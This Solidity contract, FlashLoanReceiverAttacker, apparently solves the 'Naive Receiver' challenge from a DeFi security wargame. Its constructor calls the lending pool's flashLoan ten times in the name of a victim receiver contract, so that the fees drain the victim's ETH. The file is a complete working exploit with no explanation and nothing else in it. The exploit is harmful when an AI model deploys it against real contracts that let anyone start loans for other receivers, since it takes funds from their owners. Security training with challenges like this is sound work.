// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract FlashLoanReceiverAttacker {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _victim) {
        for (uint8 i; i < 10; i++) {
            NaiveReceiverLenderPool(payable(_pool)).flashLoan(
                IERC3156FlashBorrower(_victim),
                ETH,
                0,
                ""
            );
        }
    }
}
